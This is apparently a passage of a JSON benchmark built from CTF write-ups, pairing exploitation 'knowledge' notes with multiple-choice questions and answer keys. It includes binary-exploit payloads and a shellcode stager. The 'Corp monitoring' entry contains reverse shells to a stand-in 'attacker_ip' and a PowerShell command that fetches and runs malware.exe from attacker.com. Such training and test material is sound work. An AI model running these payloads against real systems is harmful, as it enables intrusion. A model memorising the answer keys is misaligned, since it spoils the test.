            "When encountering a binary exploitation challenge where a `gets` function creates an opportunity for a stack buffer overflow but stack protections like canaries are in place, an alternative approach to hijack program execution involves overwriting function pointers or Global Offset Table (GOT) entries. This tactic requires precise control over the overflow payload to adjust specific memory addresses. Example usage of this technique is to overwrite an address in the GOT with the address of a useful function like `system()` by using a carefully crafted payload that avoids triggering stack canaries and takes advantage of functions like `print` to leak memory addresses necessary for calculating offsets.",
            "For challenges that involve memory leak exploitation to defeat Address Space Layout Randomization (ASLR) and identify libc versions, the use of a print function to disclose the contents of memory addresses pointed to by overwritten pointers can be crucial. This method can reveal addresses of libc functions, which can then be input into tools like https://libc.nullbyte.cat/ to determine the libc version and calculate the base address of libc in memory. This information is critical for creating an exploit that calls system functions or executes shellcode by referencing libc addresses and offsets correctly. An initial step in this process might involve overwriting a less critical pointer (such as a description pointer in a `struct`) with the address of a GOT entry to leak its runtime-resolved address through a controlled print output."
        ],
        "question": [
            "In a binary exploitation challenge featuring a `gets` function vulnerable to stack buffer overflow with stack canaries protection, which of the following strategies would be effective for hijacking program execution without triggering the canaries? - A. Overwrite the stack canary with a guessed value and then the return address. - B. Use the overflow to directly overwrite the return address on the stack. - C. Overwrite Global Offset Table (GOT) entries or function pointers to redirect execution. - D. Increase the size of the stack buffer by overwriting adjacent memory allocation metadata. ",
            "When exploiting a memory leak vulnerability to defeat ASLR and determine the libc version in a binary exploitation challenge, what initial technique is typically employed to reveal the address of libc functions? - A. Corrupting the heap metadata to print out libc addresses directly. - B. Overwriting a program's internal pointers to leak addresses through controlled print output. - C. Performing a brute force attack to guess the base address of libc. - D. Utilizing integer overflow vulnerabilities to bypass ASLR and reveal libc addresses. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Code Golf",
        "write_up": "dataset/raw/Code Golf.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 333,
        "max_score": 500,
        "difficulty": 0.666,
        "knowledge": [
            "When golfing Haskell code for space efficiency, a key strategy is to utilize Haskell's rich set of infix operators and functions that can often reduce the syntactical overhead. For instance, using `$` for application can save parentheses, `<$>` instead of `map` for benefits similar to `$`, `=<<` in place of `concatMap`, and list comprehension cleverness to reduce pattern matching syntax. These transformations help in minimizing the length of the Haskell code while maintaining functionality.  \nExample transformation:  \nOriginal: `concatMap (\\str -> replicate (length str) ' ') strings`  \nGolfed: `(>> \" \") =<< strings`",
            "In challenges involving the manipulation and combination of strings with placeholders or holes (spaces in this case), leveraging the properties of character encoding can optimize the process. For instance, knowing that ASCII space character (` `) has a lower value than any printable ASCII character, the maximum (`max`) function can be utilized to merge two characters in a way that spaces can be \"overwritten\" by any other character. This leverages the ordering of ASCII values to fill gaps in strings efficiently, which can be particularly useful in encoding or decoding challenges where minimizing the final output length is crucial.  \nExample code snippet (conceptual):  \n```haskell\nmergeChars :: Char -> Char -> Char\nmergeChars a b = max a b\n```"
        ],
        "question": [
            "In Haskell code golfing, which of the following transformations is equivalent to using `concatMap` for lists but minimized in length? - A. `map` in place of `<$>` - B. `concatMap` replaced by `=<<` - C. `foldr` instead of `foldMap` - D. Using `++` for list concatenation",
            "When combining two character variables in Haskell to optimize for a string manipulation challenge, given that one or both characters could be space (' '), which function efficiently ensures non-space characters take precedence based on ASCII values? - A. `mergeChars a b = min a b` - B. `mergeChars a b = if a == ' ' then b else a` - C. `mergeChars a b = max a b` - D. `mergeChars a b = a <> b`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Coins",
        "write_up": "dataset/raw/Coins.md",
        "type": "pwn",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When facing proof-of-work (PoW) challenges which require finding a string that hashes to a specific value, a brute force approach can be applied by iterating over all possible combinations of characters until the target hash is found. The Python `hashlib` library can be used to generate SHA256 hashes to compare with the target hash.\n    - Example payload generation script:\n    ```python\n    import hashlib, string\n\n    def solve_pow(suffix, target_hash):\n        for i in string.digits + string.ascii_letters:\n            for j in string.digits + string.ascii_letters:\n                for k in string.digits + string.ascii_letters:\n                    for l in string.digits + string.ascii_letters:\n                        prefix = str(i)+str(j)+str(k)+str(l)\n                        new_hash = hashlib.sha256((prefix+suffix).encode()).hexdigest()\n                        if new_hash == target_hash:\n                            return prefix\n    ```",
            "For challenges requiring identification of an anomalous item in a collection with minimal queries, employing binary search logic can significantly reduce the number of required queries. This strategy is applicable in scenarios where the challenge allows for indirect measurement of properties (e.g., weight via XOR operations). Preliminary queries to establish a baseline (e.g., determining the weight of non-faulty items) can further refine the search process.\n    - Example approach for finding an anomalous coin:\n    ```python\n    def find_faulty_coin(low, high, legit_weight, query_func):\n        while low < high:\n            mid = (low + high) // 2\n            response = query_func(low, mid)\n            if response == 0 or response == legit_weight:\n                low = mid + 1\n            else:\n                high = mid\n        return low  # Assumed the position of the faulty coin\n    ```\n    - Note: `query_func(low, mid)` represents a function to interact with the challenge server, sending a query for the range `[low, mid]` and returning the server's response."
        ],
        "question": [
            "Given a PoW challenge where the objective is to find the first 4 characters of a SHA256 hash that matches a given target, which Python module and method are suitable for generating the SHA256 hash to compare against the target? - A. Using the `os` module with the method `os.sha256()` - B. Using the `sys` module with the method `sys.gethash()` - C. Using the `hashlib` module with the method `hashlib.md5()` - D. Using the `hashlib` module with the method `hashlib.sha256()` ",
            "In a challenge where you're tasked with identifying a faulty coin with a different weight compared to others in a batch, given you can query the XOR of the weight of coins from index i to j, which algorithmic approach minimizes the number of queries required to find the faulty coin? - A. Linear search, checking each coin one by one - B. Binary search, halving the search space based on the responses - C. Bubble sort, repeatedly swapping adjacent coins until the faulty one is found - D. Quick sort, partitioning the coins into smaller and larger groups and sorting individually "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Compromised",
        "write_up": "dataset/raw/Compromised.md",
        "type": "crypto",
        "competition": [
            "CyberSecurityRumble/2021",
            "https://ctftime.org/event/1429/tasks/"
        ],
        "score": 564,
        "max_score": 760,
        "difficulty": 0.7421052631578947,
        "knowledge": [
            "When analyzing malware or suspicious activities within minidump files using WinDBG, it's critical to check the backtrace of threads for signs of strange behavior or calls to functions from unusual locations. Suspicious threads may call typical functions like `SleepEx` from abnormal addresses indicating potentially malicious code execution. This approach aids in the initial identification of malware components or behaviors without executing the malware.",
            "In scenarios involving encrypted malware communication, especially when dealing with complex malware such as Cobalt Strike stagers, extracting encryption keys from memory dumps or reconstructed executables allows for the decryption and analysis of command and control (C&C) communications. After identifying the encryption method and obtaining the keys (AES keys in this case), one can decrypt network traffic captured in pcap files. This process involves:\n   - Identifying the encryption algorithm and key generation process from the malware binary or memory dump,\n   - Extracting encryption keys using static analysis tools (e.g., IDA Pro for analyzing disassembled code and WinDBG for memory inspection),\n   - Decrypting the network traffic using the extracted keys to understand the malware's communication protocols and actions.\n\nExample script snippet for AES decryption (derived from analyzed malware's method of communication and encryption usage):\n```python\nfrom Crypto.Cipher import AES\n\ndef decrypt_aes(data, key):\n    iv = b\"abcdefghijklmnop\"  # Initialization vector might vary and should be identified from the malware analysis\n    aes = AES.new(key, AES.MODE_CBC, iv)\n    decrypted_data = aes.decrypt(data)\n    return decrypted_data\n```\nThis Python function uses the PyCryptodome library to decrypt data with AES in CBC mode, which is a common scenario in malware's encrypted communications."
        ],
        "question": [
            "In the context of analyzing potentially malicious activity within a minidump file using WinDBG, investigators often scrutinize the backtrace of threads. When encountering a situation where `SleepEx` is called from an unusual address in one of the threads, this might signal: - A. Legitimate system maintenance operations. - B. A standard application update process. - C. Malware attempting to disguise its execution. - D. An error in the thread management system of the operating system.",
            "When dealing with the decryption of network traffic from a malware that utilizes AES encryption for its communication with the C&C server, the first step in the process involves: - A. Sending a request to the C&C server to obtain the decryption key. - B. Identifying the encryption algorithm and retrieving the encryption keys from the malware binary or memory dump. - C. Consulting a public database of common malware encryption keys. - D. Guessing the key through brute force attacks on the encrypted traffic."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Computeration Fixed",
        "write_up": "dataset/raw/Computeration Fixed.md",
        "type": "web",
        "competition": [
            "justCTF/2021",
            "https://ctftime.org/event/1050/tasks/"
        ],
        "score": 333,
        "max_score": 500,
        "difficulty": 0.666,
        "knowledge": [
            "When exploiting client-side web vulnerabilities, specifically those related to session storage and unsupported headers like `x-frame-options`, it's possible to frame the vulnerable web page in an attacker-controlled page. This can be leveraged in situations where the application fails to properly sanitize input or restrict frame embedding, allowing for potential cross-site scripting (XSS) or other client-side exploits. An iframe can be used to load the vulnerable application inside an attacker-controlled document, enabling interaction with the victim's session storage or exploiting other client-side vulnerabilities.",
            "In scenarios where a web application uses URL hash fragments (`location.hash`) for functionality such as searching or filtering content with JavaScript, controlling this URL component allows for Regex-based denial of service (DoS) attacks or other unintended interactions. Specifically, if an application executes a Regex search based on user-controllable URL fragments without proper validation or sanitization, attackers can craft malicious Regex patterns. These patterns can cause extensive processing time if they are designed to produce computational complexity or ambiguity, exploiting the service's Regex engine to perform actions like gradually leaking sensitive information through timing analysis or causing service disruption.\n\n   Example payload:\n   - Craft a Regular Expression that performs poorly or causes excessive computation: `^(?=justCTF{a).*.*.*.*.*.*.*.*.*.*ABCDE$`;\n   - The payload is included in the URL hash: `https://victim-site.com/#^(?=justCTF{a).*.*.*.*.*.*.*.*.*.*ABCDE$`."
        ],
        "question": [
            "In a web application vulnerability exploration, when the `x-frame-options` header is not set, which of the following actions is a direct consequence of this configuration? - A. Increases the encryption level of session cookies - B. Prevents the page from being framed irrespective of the originating site - C. Allows the page to be framed by any other website, potentially leading to Clickjacking attacks - D. Automatically redirects all HTTP requests to HTTPS to ensure secure transmission ",
            "Given a web application that executes a search function based on the URL's hash fragment without sanitizing the input, which kind of attack can be primarily facilitated by providing a RegEx pattern designed to cause significant processing delays? - A. SQL Injection attack leveraging the LIKE operator for pattern matching in database queries - B. XPath Injection attack by crafting malicious XPath queries through URL manipulation - C. Cross-Site Scripting (XSS) attack by embedding JavaScript code in the URL - D. Denial of Service (DoS) or information leakage attack via computationally intensive RegEx processing based on user-controlled input "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "config-me",
        "write_up": "dataset/raw/config-me.md",
        "type": "reverse",
        "competition": [
            "BSidesSF/2020",
            "https://ctftime.org/event/977/tasks/"
        ],
        "score": 472,
        "max_score": 493,
        "difficulty": 0.9574036511156186,
        "knowledge": [
            "When faced with encrypted data in a configuration file used by an application, and the application has the functionality to decrypt certain fields, experiment with manipulating the configuration data to exploit this functionality. This approach can lead to decrypting sensitive data, such as a flag, by abusing the application's regular decryption capabilities, without needing direct access to the decryption algorithm or key. For example, if an encrypted flag is stored in a configuration file, modifying the configuration to present the encrypted flag value in a field that is decrypted and displayed by the application (like a username or name field) can reveal the decrypted flag.",
            "Reversing binaries written in languages that compile to complex or less common assembly, like Rust, can be challenging and time-consuming due to the language's unique features and optimizations. In such cases, opting for dynamic analysis techniques, such as monitoring the program's execution, manipulating input files or data, and observing the program's output, can be a more efficient approach to understand the program's functionality and identify vulnerabilities or key operations, especially in CTF challenges designed with simpler vulnerabilities for educational purposes."
        ],
        "question": [
            "In a CTF challenge involving an application that decrypts certain fields from a configuration file, you discover that encrypted data, such as passwords or flags, is handled by the application. To reveal the plaintext of an encrypted `flag`, which technique could be effectively used based on the application's functionality?  - A. Decompile the application to analyze the encryption algorithm. - B. Inject SQL queries into the configuration file to bypass encryption. - C. Modify the configuration file to display the encrypted flag in a normally decrypted field, like a username. - D. Use brute force attack to guess the encryption key. ",
            "When analyzing a program written in Rust for a CTF challenge, you find that reversing the binary directly is impractical due to the complexity of the compiled code. What technique is suggested as a more time-efficient approach to understand the program's behavior and potentially find vulnerabilities or secrets?  - A. Performing a static code analysis using advanced decompilation tools specifically designed for Rust. - B. Running the program with different inputs and observing its behavior to understand its functionality better. - C. Directly modifying the Rust source code to remove security features and recompiling the binary. - D. Translating the binary into a more common programming language for easier analysis. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Contrived Shellcode",
        "write_up": "dataset/raw/Contrived Shellcode.md",
        "type": "pwn",
        "competition": [
            "TAMUctf/2023",
            "https://ctftime.org/event/1914/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In shellcode challenges where only specific bytes are allowed due to filtering or restrictions, assembling desired instructions can be done by adding the values of permissible bytes to a register (e.g., `eax`) in a loop until the target opcode value is reached. This technique allows bypassing the limitation and executing restricted instructions like `pop rsi`. For example, to achieve an opcode value of `0x5e` for `pop rsi` without using `0x5e` directly, one could use a series of adds, such as `add al, 0xf` repeated six times and then `add al, 0x4`.\n   \n    Example payload to assemble `pop rsi`:\n    ```python\n    rsi_pop = asm('add al, 0xf')*6 + asm('add al, 0x4')\n    ```",
            "When constructing shellcode under severe restrictions, utilizing a two-stage shellcode approach can be beneficial. The first stage, adhering to the byte restrictions, can set up the environment (e.g., register values) and use a system call to read in a second, unrestricted stage shellcode into executable memory. This method effectively bypasses the byte limitations and allows for the execution of complex shellcodes.\n\n    Example for setting up and executing a second-stage shellcode:\n    ```python\n    # Setting up RSI, RDI, and RAX for SYS_read call in the first stage\n    stage1 += pop_rsi() + zero_edi() + big_edx() + zero_rax() + asm('syscall')\n    # Loading the second stage unrestricted shellcode\n    stage2 = asm(shellcraft.nop())*(len(stage1)+0x8*5) + asm(shellcraft.sh())\n    ```"
        ],
        "question": [
            "In a constrained shellcode environment that only permits specific byte values, which technique allows for the construction of an instruction like `pop rsi` without directly using its opcode? - A. Incrementing the `eax` register with `add al, 0x4` once after adding `0xf` six times - B. Directly inserting the opcode for `pop rsi` into the shellcode - C. Using a loop to decrement `eax` until it reaches `0x5e` - D. Shifting the `eax` register left to double its value repeatedly until it reaches the desired opcode ",
            "When facing byte restrictions in a shellcode challenge, how can one execute a second, unrestricted stage shellcode? - A. By setting up the required registers and making a `syscall` to read the second-stage shellcode into memory - B. Altering the memory permissions of the stack to execute the second stage directly - C. Encoding the second-stage shellcode to match the whitelisted byte values - D. Compressing the second-stage shellcode to fit within the byte limitations "
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "Coronacation",
        "write_up": "dataset/raw/Coronacation.md",
        "type": "pwn",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 400,
        "max_score": 500,
        "difficulty": 0.8,
        "knowledge": [
            "Format string vulnerabilities can be exploited to perform both information leaks and arbitrary write operations. In the context of a CTF challenge with binary exploitation tasks, when dealing with a format string vulnerability, it is possible to leak memory addresses (such as base pointer and return address) to bypass protections like ASLR (Address Space Layout Randomization) and PIE (Position-Independent Executable). This is done by including specific format specifiers (%p for pointer leaks) in the input, which will make the program print out memory addresses. Payload construction for the leak might involve carefully choosing which position of the input corresponds to the memory address you want to leak, indicated by `%<position>$p`.\n   \n   Sample payload for leaking stack base pointer (rbp) and return address: `%14$p %15$p`",
            "After leaking necessary addresses, the next step involves overwriting a function's return address to redirect execution to a desired function (typically a `win` function in CTF challenges) to bypass PIE. This can involve calculating the offset to the return address, constructing a payload to overwrite it with the address of the `win` function. The technique of partial overwriting is useful here, particularly when the address space is large. This involves only overwriting the least significant bytes of the address if they suffice to redirect execution. In such cases, using `%hn` format specifier allows writing a short value (2 bytes) to a given address. The payload for overwriting will typically include a calculated number of characters to write followed by the `%hn` specifier and the address to overwrite, laid out in memory according to the calling convention and alignment requirements.\n\n   Sample payload for overwriting least significant bytes of a return address: `\"%NNNlx%8$hn\" + p64(address_to_overwrite)` where `NNN` is the number of characters to write to achieve the desired memory content at `address_to_overwrite`."
        ],
        "question": [
            "In a binary exploitation challenge featuring a format string vulnerability, the goal is to utilize the vulnerability to leak memory addresses to bypass protections like ASLR and PIE. Given the ability to input format specifiers to a vulnerable function, which of the following payloads correctly demonstrates the approach to leak the stack base pointer (rbp) and the return address, considering the format string vulnerability is exposed through an unfiltered user input? - A. `\"%14$s %15$s\"` - B. `\"AAA%7$x BBB%8$x\"` - C. `\"Exploit%10$dLeak%11$d\"` - D. `\"%14$p %15$p\"`",
            "During the exploitation stage after leaking necessary memory addresses, if the objective is to overwrite a function's return address with the address of a `win` function to bypass PIE, and you're limited to overwriting only the least significant bytes due to space or other constraints, which payload is correctly constructed for this purpose using the `%hn` format specifier and considering the execution context allows for direct placement of the address to overwrite in the payload? - A. `\"%9999c%4$ln\" + p32(address_to_overwrite)` - B. `\"%\" + padding + \"lx%8$hn\" + p64(address_to_overwrite)` - C. `\"%6$n\" + p32(address_to_overwrite)` - D. `\"overflow%4$hhn\" + p64(address_overflow)`"
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Corp monitoring",
        "write_up": "dataset/raw/Corp monitoring.md",
        "type": "misc",
        "competition": [
            "VolgaCTF/2018/Quals",
            "https://ctftime.org/event/539/tasks/"
        ],
        "score": 200,
        "max_score": 500,
        "difficulty": 0.4,
        "knowledge": [
            "When exploiting server-side template injection vulnerabilities in web applications that process user-provided URLs, if the server-side language is Ruby, research relevant CVEs for the Ruby version in use to potentially identify exploitable vulnerabilities for gaining remote code execution (RCE). An effective approach could involve crafting a payload that initiates a reverse shell to an attacker-controlled server, allowing command execution. \n\n    Example payload for initiating a reverse shell in Ruby:\n    ```bash\n    |bash -c 'bash -i >& /dev/tcp/attacker_ip/port 0>&1'\n    ```",
            "For SQL Injection vulnerabilities particularly in search functionalities, if traditional MySQL error-based or boolean-based payloads fail and the application does not react in a typical manner to SQL syntax manipulation, consider the possibility of the backend database being non-traditional or using a different language for queries, such as Lua. This realization can significantly shift the injection strategy towards the syntax and functions available in that language, which may enable both injection and remote code execution (RCE) opportunities.\n\n    Example payload for exploiting Lua-based SQL Injection vulnerability:\n    ```lua\n    os.execute(\"sleep 10\")\n    ```"
        ],
        "question": [
            "In a web vulnerability scenario involving the manipulation of user-provided URLs and the use of Ruby as the server-side language, which of the following payloads could potentially initiate a reverse shell, enabling remote code execution (RCE)? - A. |python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker_ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' - B. |nc -e /bin/sh attacker_ip port - C. |bash -c 'bash -i >& /dev/tcp/attacker_ip/port 0>&1' - D. |perl -e 'use Socket;$i=\"attacker_ip\";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "In the context of a SQL Injection vulnerability within a search feature where typical SQL payloads do not elicit the expected responses, indicating the database may be using Lua, which of the following payloads would be suitable for exploiting the vulnerability to achieve remote code execution (RCE)? - A. \" OR 1=1; DROP TABLE users; -- - B. os.execute(\"sleep 10\") - C. SELECT * FROM information_schema.tables WHERE table_schema = 'public' - D. xp_cmdshell('powershell Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile C:\\\\malware.exe; Start-Process C:\\\\malware.exe')"
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Corruption 500",
        "write_up": "dataset/raw/Corruption 500.md",
        "type": "misc",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When encountering issues with cloning a Git repository due to compression errors or the presence of notably large files, a potential strategy involves manually salvaging the fetched `.git` folder before it is automatically deleted upon a failed cloning attempt. This allows for partial data recovery and further investigation into the repository's contents.",
            "In scenarios where a Git repository contains a corrupted branch preventing successful fetching of all contents, modifying the repository's `config` file to limit the fetch scope to a healthy branch can facilitate data recovery. Specifically, changing the `fetch` configuration in the `.git/config` file to focus on a single branch (e.g., from `fetch = +refs/heads/*:refs/remotes/origin/*` to `fetch = +refs/heads/master:refs/remotes/origin/master`) can bypass corruption in other branches. After implementing this change, executing `git fetch --all` allows for the retrieval of uncorrupted data."
        ],
        "question": [
            "When attempting to clone a Git repository fails due to compression errors and the existence of an excessively large file, which of the following approaches is effective for potentially salvaging part of the data? - A. Wait for the cloning process to timeout and retry until it succeeds. - B. Immediately edit the `.gitignore` file to exclude large files and restart the clone process. - C. Manually copy the `.git` folder before it gets automatically deleted after a failed cloning attempt, to recover partial data. - D. Use `git clone --depth 1` to only clone the latest commit, avoiding large files. ",
            "In a situation where a Git repository's specific branch is corrupted and prevents successful fetching of content, how can you alter the repository's configuration to fetch data from a functional branch, bypassing the corruption? - A. Change permissions of the `.git` folder to restrict access to the corrupted branch. - B. Delete the reference to the corrupted branch inside the `.git/refs/` directory. - C. Modify the `fetch` line in the `.git/config` file from `fetch = +refs/heads/*:refs/remotes/origin/*` to `fetch = +refs/heads/master:refs/remotes/origin/master`, to only fetch from the master branch. - D. Apply a git filter-branch operation to remove the corrupted branch from the repository's history. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Council Of Apes",
        "write_up": "dataset/raw/Council Of Apes.md",
        "type": "The type of challenge in this write-up is a pwn challenge.",
        "competition": [
            "Glacier/2023",
            "https://ctftime.org/event/1992/tasks/"
        ],
        "score": -1,
        "max_score": 428,
        "difficulty": -1,
        "knowledge": [
            "In the presence of a flash loan feature in a DeFi contract or system, careful examination of the token balance validation mechanism is crucial. If the totalSupply of a token involved in the system's operations (e.g., swaps, loans) is manually overridden or can be manipulated, it may lead to vulnerability exploitation by supplying incorrect supply data to influence the contract's state or operations. This scenario is particularly applicable when the token contract allows for overriding of values such as totalSupply, which are typically used to validate transaction legitimacy or the feasibility of loans and swaps.",
            "When exploiting vulnerabilities in smart contracts, especially in DeFi systems with complex mechanisms like pools, swaps, and loans, creating a custom token contract that overrides critical functions (such as totalSupply) can enable the manipulation of the system's expected behavior. This manipulation can facilitate actions such as obtaining loans under false pretenses or influencing the state of pools without proper collateral or backing. It becomes evident that the integrity of token metrics (like supply figures) is paramount in maintaining the security of financial mechanisms on blockchain systems. \n\nExample payload to manipulate contract state:\n```solidity\ncontract ShyToken is TotallyNotCopiedToken {  \n    constructor(address _owner, string memory _name, string memory _symbol)\n    TotallyNotCopiedToken(_owner, _name, _symbol) {  \n    }  \n    function totalSupply() public view override returns (uint256) {  \n        return 1337; // Override to return a manipulated value\n    }  \n}\n```"
        ],
        "question": [
            "When evaluating the risks associated with flash loans in a decentralized finance (DeFi) system, why is it critical to carefully inspect the mechanism for token balance validation? - A. To ensure that the flash loan interest rates are calculated accurately - B. To prevent unauthorized users from accessing the system - C. To avoid exploitation through the supply of incorrect token supply data, potentially influencing contract operations - D. To guarantee that transaction fees are distributed fairly among participants",
            "In the context of smart contract vulnerabilities, specifically within DeFi systems incorporating pools and loans, how can creating a custom token contract that overrides the totalSupply function aid in the manipulation of the system? - A. By allowing unlimited withdrawals from the contract without proper validation - B. By enabling manipulation of the system\u2019s expected behavior, such as obtaining loans under false pretenses - C. By ensuring that all transactions are recorded on the blockchain transparently - D. By increasing the security of the contract through additional layers of validation"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Courier",
        "write_up": "dataset/raw/Courier.md",
        "type": "reverse",
        "competition": [
            "TAMUctf/2023",
            "https://ctftime.org/event/1914/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a difference in message handling between two components within a system (such as `courier` and `consignee` in a courier-delivery system emulation), an effective tactic is to create a message that is processed as valid by the initial handler (`courier`) but triggers an alternative processing path in the secondary handler (`consignee`). This can be achieved by crafting a message that meets the size and format requirements of the initial handler but includes a nested message formatted to exploit specific behavior in the secondary handler. Specifically, by utilizing the discrepancy in message length handling (`MAX_SIZE`) between the two components, an attacker can cause the second component to process an embedded message (e.g., `FlagRequest`) as if it were a top-level message, leading to unintended actions or information disclosure.  \nExample payload structure:  \n```python\nmessage = 'COURIERM'.encode() + [0x08, 0x00] + [0x00, 0x00] + 'COURIERM'.encode() + [0x00, 0x24] + [0x01, 0x0c] + [0x0d]*32 + [0x01, 0x01] + [0]*2058-len(message)\n```",
            "For embedded system emulations or simulations that involve UART communication between virtual devices, understanding and leveraging the serial communication setup and behavior can allow for interactive exploration and manipulation of the system. The ability to redirect `stdio` to a UART handle, as shown in setups with `qemu-system-arm` and `socat`, opens avenues for input/output manipulation, potentially leading to exploitation. In scenarios where such a system is part of a challenge, crafting input that manipulates or exploits the system\u2019s UART communication behavior can lead to revealing hidden functionality or extracting sensitive information (e.g., a flag)."
        ],
        "question": [
            "In a security challenge involving embedded system emulation, where a discrepancy in message size handling exists between two message handlers, an attack strategy was to send a crafted message that appears valid to the primary handler but exploits the secondary handler due to differences in `MAX_SIZE`. Which technique best describes the attack used based on the given python payload snippet? - A. Buffer overflow attack leveraging differences in memory allocation. - B. Side-channel attack exploiting timing differences in message handling. - C. Protocol manipulation by embedding a crafted sub-message exploiting handler discrepancies. - D. SQL injection by inserting malicious code within message payloads.",
            "In the context of challenging emulations involving UART-based communication between devices, which method demonstrates an effective way to explore and potentially exploit the system using `stdio` redirection to a Unix socket for UART simulation? - A. Redirecting `stdio` to a file for persistent storage of communication logs. - B. Manipulating `stdio` redirection to inject malformed data packets into the UART stream. - C. Using `socat` to redirect network sockets directly to UART, bypassing system security controls. - D. Connecting `stdio` to an UART handle using `qemu-system-arm` and `socat` to interact and potentially alter system behavior through crafted inputs."
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Covid tracker tracker tracker",
        "write_up": "dataset/raw/Covid tracker tracker tracker.md",
        "type": "pwn",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 500,
        "max_score": 800,
        "difficulty": 0.625,
        "knowledge": [
            "When encountering a use-after-free vulnerability in a heap exploitation challenge, it's critical to recognize that even after a free operation is performed, pointers to the freed memory are not automatically set to NULL. This oversight allows an attacker to manipulate or access the previously freed memory space. This mistake can be exploited by carefully sequencing allocations and deallocations of memory to control the contents of the memory that is supposed to be freed and reused. This approach is a fundamental technique for exploiting use-after-free vulnerabilities.",
            "Bypassing Full RELRO (Read-Only Relocation) can be achieved by rewriting function pointers that libc allows to be hooked, such as `__free_hook`. By manipulating heap content to control such pointers, an attacker can redirect execution flow. This technique requires bypassing ASLR (Address Space Layout Randomization) by leaking libc addresses. Address leaks can usually be achieved by controlling a format string vulnerability or by forcing the application to output memory contents indirectly referenced by pointers controlled by the attacker. For instance, making a `char*` array element point to a GOT (Global Offset Table) entry and then reading it back can leak a libc address, providing a base from where other addresses (like `__free_hook` and `system`) can be calculated.\n\nExample Exploit Step:",
            "Allocate several objects to fill the heap.",
            "Free some objects but keep their pointers.",
            "Allocate again to get one of the freed object's locations.",
            "Write to this object to corrupt heap metadata or function pointers, such as making an entry in the GOT point to `__free_hook`.",
            "Use this corruption to achieve arbitrary code execution by, for example, changing `__free_hook` to the address of `system` and passing a controlled string to be executed."
        ],
        "question": [
            "In a heap exploitation challenge showcasing use-after-free vulnerabilities, where is the critical mistake that allows exploitation as per the given scenario? - A. The `free` operation automatically clears all pointers to the freed memory. - B. Allocated memory is not tracked, allowing re-use before freeing. - C. Memory allocations and deallocations are automatically managed, preventing any misuse. - D. Pointers to freed memory are not set to NULL, allowing for manipulation or access to previously freed memory spaces.",
            "How can Full RELRO be bypassed in a scenario where exploiting heap vulnerabilities is a goal? - A. By writing directly to the GOT since Full RELRO does not protect it. - B. Manipulating non-heap memory areas to circumvent memory protection mechanisms. - C. Rewriting pointers like `__free_hook` to redirect execution flow, despite ASLR by leaking libc addresses. - D. Disabling ASLR and RELRO at the runtime through environmental variables."
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Cplusplus",
        "write_up": "dataset/raw/Cplusplus.md",
        "type": "Based on the information provided in the CTF write-up, the type of challenge is: reverse",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 357,
        "max_score": 952,
        "difficulty": 0.375,
        "knowledge": [
            "When analyzing binary exploits related to parsing and input validation, it is crucial to examine the input format and validation logic. For situations where the application expects inputs in a specific format and separates values using delimiters, understanding the parsing mechanism (for example, `boost::spirit::qi::parse` in C++ for splitting the input based on delimiters and converting them to the desired data types) is vital. This knowledge helps in constructing payloads that bypass validations or exploit the system's logic. For instance, constructing an input payload like `78@111#34` that meets the parser's expected format (`num1@num2#num3`) and numeric constraints.",
            "In challenges leveraging pseudo-random number generators (PRNGs) like `boost::mt19937`, where the outcome of the PRNG affects the program's control flow or output, the key is understanding how the PRNG is seeded and manipulated. The PRNG's behavior (including state copying and how many values are discarded) can influence the correct value to provide or predict the PRNG output. An effective approach involves closely analyzing the seeding process, the operation applied on the seed (e.g., the number of discarded outputs using `num % 12` or `num / 12`), and the conditions that the PRNG's output must satisfy (e.g., matching a specific number like `3570126595`). Crafting a payload may include calculating or brute-forcing the seed value that leads to the desired PRNG output, considering the state copy behavior and discard operations."
        ],
        "question": [
            "When using the `boost::spirit::qi::parse` function to parse an input string into multiple unsigned short values separated by specific delimiters, what is the correct sequence of parsers and actions to parse an input of the form `num1@num2#num3`?  - A. `int_ >> char('@') >> int_ >> char('#') >> int_` - B. `ushort_ >> char('@') >> ushort_ >> char('#') >> ushort_` - C. `ushort_[_1] >> char_('@') >> ushort_[_1] >> char_('#') >> ushort_[_1]` - D. `ushort_[ref(res.num1) = _1] >> char('@') >> ushort_[ref(res.num2) = _1] >> char('#') >> ushort_[ref(res.num3) = _1]` ",
